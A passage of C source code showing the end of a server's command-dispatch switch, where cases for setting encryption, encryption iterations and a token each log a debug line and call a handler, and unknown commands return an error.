      __peserver_debug(server, sock, "[CRTL] Process set encrypt\n");
      __peprotocol_process_set_encrypt(protocol, server, sock);
      break;

    case CMD_SEND_SET_ENCRYPT_ITERATIONS:
      __peserver_debug(server, sock, "[CRTL] Process set encrypt iterations\n");
      __peprotocol_process_set_encrypt_iterations(protocol, server, sock);
      break;

    case CMD_SEND_SET_TOKEN:
      __peserver_debug(server, sock, "[CRTL] Process set token\n");
      __peprotocol_process_set_token(protocol, server, sock);
      break;

    default:
      __peserver_debug(server, sock, "[CRTL] Invalid command\n");
      __peprotocol_process_receive_error(protocol, sock);
      break;
  }

  return false;
}
